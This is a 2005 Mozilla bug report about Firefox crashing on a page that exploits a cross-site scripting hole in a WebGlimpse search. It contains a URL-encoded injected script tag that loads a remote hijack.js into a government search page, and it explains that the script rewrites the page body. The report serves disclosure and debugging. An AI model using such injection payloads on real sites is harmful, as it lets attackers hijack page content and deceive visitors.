Crashes Mozilla when URL loads
User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.0; en-GB; rv:1.7.8) Gecko/20050511 Firefox/1.0.4

The above URL is an exploit, demonstrating how an insecure search can be used to
hijack a webpage's content.  This exploit is with WebGlimpse, NOT Mozilla.  The
Problem with Mozilla is that 75% of the time the browser crashes.
<P>
This has been seen on Windows 2000 and Windows 98.  Could someone with Deer Park
verify that this is still a problem?
<P>
The exploit has been reported to WebGlimpse, so I expect they will fix the above
URL soon.

Reproducible: Sometimes

Steps to Reproduce:
1. Click URL.

Actual Results:  
Mozilla usually crashes.

Expected Results:  
A page like this should have been displayed:
http://search.access.gpo.gov/usoge/SearchRight.asp?ct=usoge&q1=%3CSCRIPT+SRC%3D%27http%3A%2F%2Fneil.fraser.name%2Fnews%2F2005%2Fhijack.js%27%3E%3C%2FSCRIPT%3E&x=0&y=0

The script (http://neil.fraser.name/news/2005/hijack.js) executes this statement
to rewrite the entire page:
  document.body.innerHTML = text
where 'text' is the desired content.  This works on the 25 other pages I've
tested it on, but the WebGlimpse page seems to be different.

If someone could verify this bug and confirm its existance in Deer Park, I'll do
some work to isolate it with a minimal test case.  My crash ID is: TB7531346E
